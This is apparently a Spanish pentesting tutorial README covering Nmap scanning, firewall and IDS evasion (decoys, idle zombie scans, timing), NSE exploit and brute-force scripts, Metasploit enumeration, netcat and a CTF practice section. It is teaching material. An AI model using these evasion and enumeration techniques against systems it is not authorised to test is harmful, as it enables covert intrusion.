+<p align="center">
+
+  <img src="https://i.postimg.cc/j2xksy9s/118.png" alt="Descripción de la imagen">
+
+</p>
+
+<p><b> "Forzar a que indique la version" </b> El parámetro --version-intensity (o -sV --version-intensity) en Nmap controla el nivel de agresividad en la detección de versiones de servicios durante un escaneo de servicios (-sV). </p> 
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/3rqgrgzn/119.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/jSHNhBCr/120.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+
+
+<!----------------------------------------------------------------------------- Evasión, rendimiento de escaneo y salida----------------------------------------------------------------------------->
+
+
+
+<center> <h2> :arrow_right: Firewall Detection & IDS Evasion  / Detección de firewall y evasión de IDS </h2> </center>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/j2vBwzrb/138.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<h2> :white_check_mark: Detección de Firewalls </h2> 
+
+
+
+<p> La detección de firewalls se realiza principalmente durante el escaneo de puertos para identificar si un firewall está bloqueando tráfico, droppeando paquetes o rechazando conexiones. Nmap usa varias técnicas pasivas y activas para inferir la presencia de un firewall:<p>
+
+
+<p>Tecnicas principales<p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/B6hy023F/140.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p>Fingerprinting de firewalls específicos:<p>
+
+
+<p>Fingerprinting, es la técnica de recopilar y analizar información sobre un sistema, red, aplicación o dispositivo para identificar sus características específicas, como el sistema operativo, versión de software, servicios en ejecución, bibliotecas usadas o incluso el navegador y plugins de un usuario.<p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/gJf7jmwd/141.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<h2> :white_check_mark: Evasión de IDS/IPS y Firewalls </h2> 
+
+
+<p> Los IDS/IPS detectan patrones de escaneos (e.g., Snort rules para SYN floods). Nmap evade alterando tráfico para evitar firmas, rate-limiting y reensamblado:<p>
+
+
+<p>Tecnicas principales<p>
+
+<p>Fragmentación y manipulación de paquetes:<p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/FH3HHH7d/142.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<p> Scans evasivos por tipo:<p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/13fYG8pP/144.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p> Evasión específica por producto <p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/HxsMMyMD/145.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<p> Scripts NSE para evasión <p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/HxsMMyMD/145.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<h2> :white_check_mark: Bypass firewall </h2> 
+
+
+
+<p> :radio_button: Decoy Scan / Escaneo de señuelos </p>
+
+  <h3> <b> nmap -D </b> </h3>
+
+
+<p> Nmap emplea direcciones IP señuelo para ocultar el origen de un escaneo, lo que complica la identificación del escáner real. Los usuarios pueden especificar múltiples direcciones IP señuelo utilizando la opción -D dentro del comando Nmap. Si bien los escaneos señuelo pueden plantear desafíos para que los registros del firewall rastreen hasta el iniciador, es fundamental verificar que los hosts señuelo estén en línea. Además, el uso excesivo de señuelos puede provocar congestión en la red, lo que justifica tener precaución en su implementación. </p>
+
+
+<h3> Esta opción permite especificar manualmente las direcciones IP de los señuelos <b> nmap -D señuelo1, señuelo2, señuelo3 .... [IP objetivo] </b> </h3>
+
+
+<h3> Esta opción genera un número aleatorio de señuelos. (generará 5 direcciones IP para escanear este dns). <b> nmap -D RND:5 [IP de destino] </b> </h3>
+
+
+
+
+<p> :radio_button: Idle Zombie Scans </p>
+
+
+  <h3> <b> nmap -sI </b> </h3>
+
+
+<p> La técnica Idle Zombie Scan es un método sofisticado empleado en evaluaciones de seguridad de red para realizar escaneos de puertos en hosts de destino utilizando hosts inactivos dentro de la red. Su principal ventaja radica en sus notables sigilosidades, ya que oscurece el origen del escaneo al atribuir la dirección IP del host inactivo “Zombie” en los archivos de registro del firewall, ocultando así la identidad del escáner real.
+
+Para garantizar resultados precisos, es imperativo identificar hosts inactivos dentro de la red. El marco Metasploit proporciona un escáner dedicado diseñado precisamente para este propósito, facilitando el descubrimiento de hosts inactivos y mejorando la eficacia de la implementación de este tipo de escaneo.
+
+Para ejecutar este escaneo con éxito, es necesario localizar un host en la red que esté inactivo y utilice secuencias IPID, ya sea Incremental o Broken Little-Endian Incremental.
+
+En Nmap, la dirección IP 192.168.1.0 se designa como host zombie, mientras que el objetivo del escaneo es la dirección IP 192.168.1.1. Este comando emplea la técnica Idle Zombie Scan, utilizando el host inactivo (el zombi) para realizar un escaneo sigiloso del puerto en el host de destino. </p>
+
+<h3> <b> nmap -sI [señuelo] [IP objetivo] </b> </h3>
+
+
+
+
+
+<p><b> :white_check_mark: • Escaneo TCP FIN (-sF) :&nbsp; En ocasiones, un filtro de red o un firewall puede detectar un escaneo SYN. En tales casos, es necesario emplear un tipo de paquete diferente en un escaneo de puertos. Con el escaneo TCP FIN, se envía un paquete FIN a un puerto de destino. Si el puerto está cerrado, el sistema de destino devuelve un paquete RST. Si no se recibe nada del puerto de destino, se puede considerar abierto, ya que el comportamiento normal sería ignorar el paquete FIN.</b></p> 
+
+<p>NOTA:&nbsp; Un escaneo TCP FIN no es útil cuando se escanean sistemas basados en Windows, ya que responden con paquetes RST, independientemente del estado del puerto.</p>
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/wvD7J7x2/5-9.png" alt="Descripción de la imagen">
+
+</p></p>
+
+</br>
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/bw28d4wH/5-10.png" alt="Descripción de la imagen">
+
+</p></p>
+
+
+
+
+<h2> :arrow_right: Optimización de escaneos Nmap  </h2> 
+
+
+<h2> :white_check_mark: Timing y evasión temporal: </h2> 
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/xTBktZWp/147.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+
+
+<p> Fragmentación de paquetes y timing lento y reducir la probabilidad de ser detectado.</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/hP9GSGJj/143.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p>•T0 (Paranoico) :  muy lento, se usa para la evasión de IDS </p>
+<p>•T1 (Furtivo) :  bastante lento, se usa para la evasión de IDS </p>
+<p>•T2 (Educado) :  se ralentiza para consumir menos ancho de banda, se ejecuta aproximadamente 10 veces más lento que el valor predeterminado </p>
+<p>•T3 (Normal) :  predeterminado, un modelo de tiempo dinámico basado en la capacidad de respuesta del objetivo </p>
+<p>•T4 (Agresivo) :  supone una red rápida y confiable y puede abrumar a los objetivos </p>
+<p>•T5 (Demente) :  muy agresivo; probablemente abrumará a los objetivos o perderá los puertos abiertoswindows + enter abre terminal </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/SRyCxWLC/5-4.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+
+<h2> :arrow_right: Formatos de salida de Nmap </h2> 
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/Z5sh890M/148.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p><b>:white_check_mark: &nbsp;  Formato Normal (-oN )</b>.</p>
+
+
+<p> Descripción: Legible para humanos, similar a la salida en pantalla pero guardada en un archivo de texto plano.</p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/Xv347MGX/149.png" alt="Descripción de la imagen">
+
+</p>
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/85XSHjyM/150.png" alt="Descripción de la imagen">
+
+</p>
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/L5rFcGFM/151.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<p><b>:white_check_mark: &nbsp;  Formato XML (-oX )</b>.</p>
+
+
+
+<p> Es legible por máquinas y permite parsear los resultados con scripts, herramientas como Metasploit, Nessus o Zenmap.</p>
+
+
+<p> Importar el escaneo de Nmap al marco de Metasploit </p>
+
+
+
+<p> 1. Iniciar el servicio de base de datos  &nbsp; Escaneos masivos/continuos: Almacenar historial de múltiples escaneos,  Queries SQL para generar informes </p>
+<p> 2. Iniciar Metasploit </p>
+<p> 3. Validar la conexion de la base de datos con Metasploit </p>
+<p> 5. validar el espacio de trabajo </p>
+<p> 6. Crear o usar un espacio de trabajo </p>  
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/hG7cWkfP/153.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p> Importar resultados de Nmap en formato XML a Metasploit mediante db_import automatiza completamente el pentest: convierte horas de recon manual en segundos de explotación masiva, poblando automáticamente la base de datos con hosts, servicios, versiones y vulnerabilidades detectadas para que comandos como hosts, services, vulns y search type:exploit $SERVICE generen ataques precisos contra todos los objetivos sin tecleo manual; permite pivoting instantáneo entre sesiones, tracking de loot/credenciales/notas NSE, y exportación de reportes profesionales, escalando de 10 a 10k hosts sin esfuerzo mientras cruza tu scan con 3000+ exploits de la DB de Metasploit para own everything con un solo exploit -j</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/sXhYWgx4/154.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+
+<p><b>:white_check_mark: &nbsp;  Formato Grepable (-oG )</b>.</p>
+
+
+<p> La opción -oG en Nmap genera salida en formato Grepable (uno por línea, fácil de parsear)..</p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/XvJS4TqF/155.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<p> Opciones recomendadas </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/mgL2WVXK/279.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<h3> 🛠 &nbsp;Herramientas</h3>
+
+</br>
+
+<p><b> • Escáneres de puertos :</b> &nbsp; Nmap, Rustscan, Unicornscan, Masscan, Kiterunner</p>
+<p><b> • Descubrimiento de red :</b> &nbsp;Netdiscover, SSB, SNMPwalk, ldapsearch, BloodHound</p>
+
+
+
+</br>
+
+
+<h2>:white_check_mark: &nbsp; Sniffing Attack / Ataque de olfateo </h2>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/bJrmmmn5/307.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+
+<p>Es un tipo de ataque de red donde un atacante intercepta y analiza el tráfico de red no cifrado o débilmente protegido para obtener información sensible, como credenciales o datos sensibles.</p>
+
+
+
+<p>:radio_button:  El atacante coloca su sistema en una posición que le permite capturar el tráfico de red (ej: router, switch).</p>
+<p>:radio_button:  Utiliza herramientas como Wireshark, tcpdump o ettercap para interceptar paquetes.</p>
+<p>:radio_button:  Analiza los paquetes capturados para extraer información útil (ej: contraseñas, cookies).</p>
+
+
+
+<p>Herramientas</p>
+
+
+<p>:radio_button: Tcpdump &nbsp; es una interfaz de línea de comandos gratuita y de código abierto (CLI) programa que ha sido portado para funcionar en muchos sistemas operativos. Es liviano y está disponible en la mayoría de sistemas Linux por defecto.</p>
+
+<p>:radio_button: Wireshark &nbsp; es una interfaz gráfica de usuario gratuita y de código abierto (GUI) programa disponible para varios sistemas operativos, incluidos Linux, macOS y Windows. Proporciona potentes capacidades de filtrado, disección de protocolos y visualización</p>
+
+<p>:radio_button: Tshark &nbsp;es un alternativa CLI a Wireshark que utiliza el mismo motor de disección. Es útil para secuencias de comandos y automatización..</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/7hfYYr2M/308.png" alt="Descripción de la imagen">
+
+</p>
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/BZVn7tWf/309.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<h2> :arrow_right: 🛠 &nbsp;Practica - CTF </h2>
+
+
+<p> :white_check_mark: FLAG 1 &nbsp;Identidad del servidor </p>
+
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/PJpTChg5/126.png" alt="Descripción de la imagen">
+
+</p></p>
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/nLf4TGZP/132.png" alt="Descripción de la imagen">
+
+</p></p>
+
+
+
+
+
+<p> :white_check_mark: FLAG 2 &nbsp; Validacion de archivos que deben permanecer ocultos</p>
+
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/MG4vdWyv/133.png" alt="Descripción de la imagen">
+
+</p></p>
+
+
+<p> Descargar el archivo de la URL </p>
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/SR4Qvjjp/134.png" alt="Descripción de la imagen">
+
+</p></p>
+
+
+<p> Opcion 2: Validacion en la URL</p>
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/Dw99gHSf/135.png" alt="Descripción de la imagen">
+
+</p></p>
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/gJdf9hy7/136.png" alt="Descripción de la imagen">
+
+</p></p>
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/85HxTCtJ/137.png" alt="Descripción de la imagen">
+
+</p></p>
+
+
+
+<p> :white_check_mark: FLAG 3 &nbsp; Acceso anónimo FTP </p>
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/vZpqyyzd/128.png" alt="Descripción de la imagen">
+
+</p></p>
+
+
+<p> :white_check_mark: FLAG 4 &nbsp; Acceso a la base de datos </p>
+
+
+<p> Resultado del escaneo de Nmap donde se identifica que el puerto 3306 se encuentra abierto corriendo el servicio de <b> MySQL 8.0.39-0ubuntu0.22.04 </b>. </p>
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/gcH0Qqpr/130.png" alt="Descripción de la imagen">
+
+</p></p>
+
+<p> Se identifica el usuario y contraseña de la base de datos en el archivo creds.txt </b>. </p>
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/jCY2KLLv/129.png" alt="Descripción de la imagen">
+
+</p></p>
+
+<p> Comandos Básicos de Conexión </b>. </p>
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/jCY2KLLv/129.png" alt="Descripción de la imagen">
+
+</p></p>
+
+
+</br>
+</br> 
+
+
+
+
+
+
+<!------------------------------------------------------------------------- ## Fase 2. Enumeracion y Análisis de vulnerabilidades ------------------------------------------------------------------------------------------>
+
+<!--horizontal divider(gradiant)-->
+<img src="https://user-images.githubusercontent.com/73097560/115834477-dbab4500-a447-11eb-908a-139a6edaec5c.gif">
+
+
+
+<div id="user-content-toc">
+  <ul align="center">
+    <summary><a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=39&pause=1000&color=F70000&width=600&height=60&lines=Fase+2.+Enumeraci%C3%B3n" alt="Typing SVG" /></a></summary>
+  </ul>
+</div>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/Mp6CtyhM/214.png">
+</p>
+
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/kgsWrP5Q/reconocimiento-vs-enumeracion.jpg">
+</p>
+
+
+</br>
+
+
+
+<p> La enumeración se utiliza para recopilar información detallada y específica sobre el objetivo una vez que se ha completado el reconocimiento inicial. </p>
+
+
+<p><b> 1. Identificar servicios y versiones:</b> Determinar qué puertos están abiertos y qué servicios (HTTP, SSH, FTP, SMB, etc.) se ejecutan en ellos, incluyendo sus versiones exactas. Esto permite buscar vulnerabilidades conocidas (CVEs) asociadas a esas versiones.</p>
+
+
+<p><b> 2. Descubrir usuarios y cuentas válidas:</b> Extraer nombres de usuarios del sistema, cuentas de correo, o credenciales mediante técnicas como enumeración de SMB (enum4linux), consultas LDAP, o fuerza bruta de usuarios en servicios como SSH o VPN.</p>
+
+
+<p><b> 3. Mapear recursos compartidos: </b> Encontrar recursos compartidos en red (como carpetas SMB o NFS), sus permisos, y qué información sensible pueden contener.</p>
+
+
+<p><b> 4. Recolectar información de aplicaciones web: </b> Detectar directorios ocultos, parámetros, tecnologías del lado del servidor (CMS, frameworks, versiones de PHP/ASP.NET), archivos de configuración expuestos, y endpoints API.</p>
+
+
+<p><b> 5. Identificar vulnerabilidades potenciales: </b>Con la información recolectada (versiones, configuraciones, usuarios), se pueden correlacionar con bases de datos de vulnerabilidades para planificar la fase de explotación.</p>
+
+
+
+
+<p> La diferencia entre reconocimiento activo y enumeracion: &nbsp; el reconocimiento activo busca recopilar información inicial del objetivo (a veces interactuando directamente con él), mientras que la enumeración es una fase más profunda y técnica que extrae detalles específicos de servicios, usuarios y recursos disponibles en el sistema. En otras palabras, el reconocimiento responde a “¿qué hay ahí afuera?”, y la enumeración a “¿qué exactamente puedo encontrar y explotar?”.</p>
+
+
+<p><b>  • Reconocimiento Activo </b>  = "¿Qué puertas están abiertas?" </p>
+<p><b>  • Enumeración </b>  = "¿Qué hay detrás de cada puerta?" </p>
+
+
+</br>
+
+
+
+<!----------------------------------------------------------------------------- ## Enumeracion NMAP Scripting Engine (NSE) ------------------------------------------------------------------------------------------------------------------>
+
+</br>
+
+
+
+<h2>  :arrow_right: Port Scanning & Enumeration with Nmap </h2>
+
+
+
+<div id="user-content-toc">
+  <ul align="center">
+    <summary><h3 style="display: inline-block">🛠 NMAP Scripting Engine (NSE) </h3></summary>
+  </ul>
+</div>
+
+ <p align="center">
+
+ <img src="https://i.postimg.cc/4xXgh65J/NMAP.png" alt="Descripción de la imagen">
+
+ </p>
+
+</br>
+</br>
+
+<p> El NSE (Nmap Scripting Engine - Motor de Scripting de Nmap ) permite a los usuarios automatizar y ampliar las capacidades de Nmap mediante scripts escritos en el lenguaje de programación Lua. Estos scripts pueden realizar tareas como detección de vulnerabilidades, recolección de información, explotación de servicios y más.</p>
+
+
+<p> Los Scripts se encuentran en la ruta "<b> ls /usr/share/nmap/scripts/ </b>"</p>
+
+
+
+ <p align="center">
+
+ <img src="https://i.postimg.cc/hjV4TRpH/121.png" alt="Descripción de la imagen">
+
+ </p>
+
+
+
+<p> filtrar los scripts especificando la expresion de la busqueda </p>
+
+
+
+ <p align="center">
+
+ <img src="https://i.postimg.cc/8cC3DhJy/122.png" alt="Descripción de la imagen">
+
+ </p>
+
+
+
+<h2> Categorías de scripts:(NSE)</h2>
+
+
+<p>Los scripts de Nmap Scripting Engine (NSE) se organizan en categorías que determinan su propósito y comportamiento. Puedes filtrarlos con script-args o --script="categoria"</p> 
+
+
+
+ <p align="center">
+
+ <img src="https://i.postimg.cc/yxqPpch7/123.png" alt="Descripción de la imagen">
+
+ </p>
+
+
+ <p align="center">
+
+ <img src="https://i.postimg.cc/3xtf3LQw/124.png" alt="Descripción de la imagen">
+
+ </p>
+
+
+
+<h2> :white_check_mark: Escaneo (-sC) :&nbsp; ejecuta todos los Scripts NSE por defecto (Nmap Scripting Engine).</h2>
+
+
+
+
+ <p align="center">
+
+ <img src="https://i.postimg.cc/ZqyQ5R1k/93.png" alt="Descripción de la imagen">
+
+ </p>
+
+
+
+
+<h2> :white_check_mark: Paramentro (-A) </b>:&nbsp; Esta opción habilita opciones avanzadas y agresivas adicionales. Actualmente, habilita la <b> detección del sistema operativo (-O), el escaneo de versiones (-sV), el escaneo de scripts (-sC) y el traceroute (--traceroute)</h2> 
+
+
+<p>Nota: dado que el escaneo de scripts con la configuración predeterminada se considera intrusivo, no debe utilizar -A en redes de destino sin permiso. Esta opción solo habilita funciones, y no opciones de tiempo (como -T4) u opciones de detalle (-v) que quizá también desee utilizar. Las opciones que requieren privilegios (por ejemplo, acceso de root), como la detección del sistema operativo y traceroute, solo se habilitarán si se dispone de dichos privilegios. </p> 
+
+
+ <p align="center">
+
+ <img src="https://i.postimg.cc/WbDGX07B/125.png" alt="Descripción de la imagen">
+
+ </p>
+
+
+
+<p>Ejemplo de uso de script:&nbsp;  nmap --script (nombre_del_script) (objetivo) </p>
+
+<p>(Auth):&nbsp; Su objetivo principal es identificar configuraciones inseguras en los servicios como FTP, SSH, HTTP, SMB, etc. Tales como credenciales predeterminadas o vulnerabilidades relacionadas con la autenticación.</p>
+
+</br>
+
+ <img src="https://i.postimg.cc/Njyp9gD4/6.png" alt="Descripción de la imagen">
+
+</br>
+
+
+
+
+<h2> :white_check_mark: (Discovery): &nbsp; Descubrimiento de hosts y servicios con mayor alcance y profundidad que un escanero comun.</h2>
+
+<p> • Descubrir hosts activos en la red (ej. con ARP, ICMP).</p>
+<p> • Enumerar servicios ocultos (ej. SNMP, SMB, DNS).</p>
+<p> • Recopilar metadatos (ej. sistemas operativos, dispositivos IoT, información de DNS).</p>
+
+
+</br>
+
+ <img src="https://i.postimg.cc/7YGbc6N0/6-1.png" alt="Descripción de la imagen">
+
+</br>
+
+
+ <img src="https://i.postimg.cc/wBVBJs68/6-2.png" alt="Descripción de la imagen">
+
+</br>
+
+
+ <img src="https://i.postimg.cc/CMtxj0V1/6-3.png" alt="Descripción de la imagen">
+
+</br>
+
+
+ <img src="https://i.postimg.cc/d13JyHHr/6-4.png" alt="Descripción de la imagen">
+
+</br>
+</br>
+
+
+
+<h2> :white_check_mark: (Exploit):&nbsp; Está diseñado para probar y explotar vulnerabilidades conocidas en sistemas o servicios. Su objetivo principal es verificar si un objetivo es vulnerable a un ataque específico, proporcionando una forma controlada de demostrar el riesgo </h2>
+
+
+
+</br>
+
+ <img src="https://i.postimg.cc/L8sc8Yn0/6-5.png" alt="Descripción de la imagen">
+
+</br>
+
+ <img src="https://i.postimg.cc/9fRsy6Pd/6-6.png" alt="Descripción de la imagen">
+
+</br>
+</br>
+
+<p>Ejemplo de script :&nbsp;  Exploit</p>
+
+</br>
+
+ <img src="https://i.postimg.cc/5Nf5hD0f/6-7.png" alt="Descripción de la imagen">
+
+</br>
+</br>
+
+<h2> :white_check_mark: (Vuln):&nbsp; Diseñado para detectar vulnerabilidades conocidas en servicios, sistemas o aplicaciones </h2>
+
+</br>
+
+ <img src="https://i.postimg.cc/j5CGKvhj/6-8.png" alt="Descripción de la imagen">
+
+</br>
+
+ <img src="https://i.postimg.cc/XqCmBJmS/6-9.png" alt="Descripción de la imagen">
+
+</br>
+</br>
+
+
+
+<h2> :white_check_mark: (Brute):&nbsp; Diseñado para realizar ataques de fuerza bruta contra servicios de autenticación (como FTP, SSH, HTTP, SMB, etc.). Su objetivo es probar credenciales predeterminadas o débiles para identificar accesos no autorizados. </h2>
+
+</br>
+
+ <img src="https://i.postimg.cc/VkGg1wZj/7.png" alt="Descripción de la imagen">
+
+</br>
+</br>
+
+<p>Ejemplo de script :&nbsp;  Brute </p>
+
+</br>
+
+ <img src="https://i.postimg.cc/8CfRS66S/7-1.png" alt="Descripción de la imagen">
+
+</br>
+</br>
+
+
+<h2> :white_check_mark: (Safe):&nbsp; Diseñado para realizar pruebas no intrusivas y seguras en sistemas y servicios. A diferencia de los scripts vuln o brute, los scripts safe están pensados para no causar ningún daño o interrupción en los sistemas objetivo, lo que los hace ideales para: </h2>
+
+<p> • Escaneos preliminares en entornos sensibles.</p>
+<p> • Auditorías de cumplimiento donde se requiere minimizar riesgos.</p>
+<p> • Verificación básica de servicios sin afectar su funcionamiento.</p>
+
+</br>
+
+ <img src="https://i.postimg.cc/G2Y6HtZ0/7-2.png" alt="Descripción de la imagen">
+
+</br>
+
+
+<!----------------------------------------------------------------------------- ## Enumeracion Metasploit ------------------------------------------------------------------------------------------------------------------>
+
+<div id="user-content-toc">
+  <ul align="center">
+    <summary><h3 style="display: inline-block">🛠 Metasploit </h3></summary>
+  </ul>
+</div>
+
+</br>
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/Gm5j0V6v/1.jpg" alt="Descripción de la imagen">
+
+ </p>
+
+
+<p>En Metasploit, puedes realizar enumeración de usuarios en diferentes protocolos y servicios, como Kerberos, SMB, LDAP, HTTP, entre otros.</p>
+
+
+
+<p> Syntax: search enumusers: &nbsp; filtrar por todos los modulos relacionados con enumeracion de usuarios</p>
+
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/tRs2Xhhh/3.png" alt="Descripción de la imagen">
+
+ </p>
+
+<p> usar modulo ejemplo: [use 6] o [use auxiliary/scanner/ssh/ssh_enumusers] </p>
+
+<p> 1. Establecer la IP objetivo:&nbsp; set RHOSTS [IP objetivo] </p>
+<p> 2. Especificar el archivo de usuarios a comparar con los usuarios del objetivo set USER_FILE [RUTA_DEL_ARCHIVO_CON_USUARIOS] </p>
+<p> &nbsp; Nota: &nbsp; El archivo usuarios.txt debe contener una lista de nombres de usuario, uno por línea</p>
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/wvZP6FMG/5.png" alt="Descripción de la imagen">
+
+ </p>
+
+<p> 3. Ejecutar el módulo [run] </p>
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/KjbPrgHY/4.png" alt="Descripción de la imagen">
+
+ </p>
+
+
+<p> Resultado: Usuarios que se encuentran en el servidor objetivo </p>
+
+<p> &nbsp; Nota: &nbsp; con el comando [options] sirve para validar los parametros que se pueden configurar </p>
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/RFK1HTG8/6.png" alt="Descripción de la imagen">
+
+ </p>
+
+
+
+
+<h2> :arrow_right: Importing Nmap Scan Results into MSF / Importación de resultados de escaneo de Nmap a MSF </h2> 
+
+
+<p> ----------- Fragmento tomado de Formatos de salida ----> XML (-oX )</b>.</p></p>
+
+
+<p> 1. Iniciar el servicio de base de datos  &nbsp; Escaneos masivos/continuos: Almacenar historial de múltiples escaneos,  Queries SQL para generar informes </p>
+<p> 2. Iniciar Metasploit </p>
+<p> 3. Validar la conexion de la base de datos con Metasploit </p>
+<p> 5. validar el espacio de trabajo </p>
+<p> 6. Crear o usar un espacio de trabajo </p>  
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/hG7cWkfP/153.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p> Importar resultados de Nmap en formato XML a Metasploit mediante db_import automatiza completamente el pentest: convierte horas de recon manual en segundos de explotación masiva, poblando automáticamente la base de datos con hosts, servicios, versiones y vulnerabilidades detectadas para que comandos como hosts, services, vulns y search type:exploit $SERVICE generen ataques precisos contra todos los objetivos sin tecleo manual; permite pivoting instantáneo entre sesiones, tracking de loot/credenciales/notas NSE, y exportación de reportes profesionales, escalando de 10 a 10k hosts sin esfuerzo mientras cruza tu scan con 3000+ exploits de la DB de Metasploit para own everything con un solo exploit -j</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/sXhYWgx4/154.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p> ---------------------------------</p>
+
+<p> Realizar un nuevo escaneo dentro de Metasploit con el fin de que se almacene el resultado directamente en la herramienta de Metasploit </p>
+
+
+<p> 1. Crear un nuevo espacio de trabajo </p>
+<p> 2. Iniciar Metasploit </p>
+<p> 3. Validar la conexion de la base de datos con Metasploit </p>
+<p> 5. validar el espacio de trabajo </p>
+<p> 6. Crear o usar un espacio de trabajo </p>  
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/2Ss4HPx5/156.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<h2> :arrow_right: Port Scanning with Auxiliary Modules Metasploit</h2> 
+
+<p> una vez se encuentra dentro del Workspace se pueden comenzar a interactuar con los modulos auxiliares </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/qqGTYVKs/158.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<!----------------------------------------------------------------------------- ## Enumeracion Netcat ------------------------------------------------------------------------------------------------------------------>
+
+
+<div id="user-content-toc">
+  <ul align="center">
+    <summary><h3 style="display: inline-block">🛠 NETCAT </h3></summary>
+  </ul>
+</div>
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/G3vVJB99/netcat.png" alt="Descripción de la imagen">
+
+ </p>
+
+</br>
+
+
+<p>Netcat (nc) es una herramienta de red versátil conocida como la "navaja suiza" de las redes. Permite leer y escribir datos en conexiones de red usando protocolos TCP o UDP. Es ampliamente utilizado en pruebas de penetración, administración de redes y debugging.</p>
+
+<p> &nbsp; &nbsp;<b> Nota: El trafico no esta encriptado</b></p>
+
+<p> Usos comunes de NETCAT</p>
+
+<p> <h4> 1. Depuración de redes </h4> </p>
+<p>    &nbsp; &nbsp;  • Verifique si un puerto está abierto o cerrado.</p>
+<p>    &nbsp; &nbsp;  • Probar servicios de red (HTTP, SMTP, etc.).</p>
+
+<p> Syntax: nc -nv -w1 -z</p>
+<p> nc -zv  [IP] [PUERTO] </p>
+
+<h3> Comandos </h3>
+
+<p> • -z: &nbsp; Modo de escaneo sin enviar datos, definir el rango de puertos a escanear sin establecer conexion completa </p>
+<p> • -v: &nbsp; Muestra informacion detallada de la conexion  "Sin -v no mostrara si el puerto esta abierto o cerrado" </p>
+<p> • -n: &nbsp; Evita la resolucion DNS (acelera el escaneo) Util cuando no se requiere resolver nombres de dominio </p>
+<p> • -u  &nbsp; Escaneo UDP (por defecto NETCAT usa TCP) </p>
+<p> • -w 1 &nbsp; Definir tiempo de espera para la conexion si el puerto no responde en "n" segundos pasa al siguiente </p>
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/LXd5G1Cn/1.png" alt="Descripción de la imagen">
+
+ </p>
+
+
+<p> &nbsp; &nbsp; NETCAT  no tiene incorporada la opcion de escanear varios host por lo tanto existen dos soluciones:   </p>
+<p> &nbsp;  • Bash scripts one-liner</p>
+<p> &nbsp;  • Script en Phython  </p>
+
+
+<p> <h4> Otros usos de NETCAT </h4> </p>
+
+<p> 2. Transferencia de archivos : &nbsp; &nbsp;   Enviar o recibir archivos entre hosts.</p>
+
+<p> 3. Shell remoto: Permite enviar y recibir datos en texto plano o binarios.</p>
+
+<p> 4. Proxy y tunelización: &nbsp; &nbsp;   Redirigir el tráfico a través de un host intermedio.</p>
+
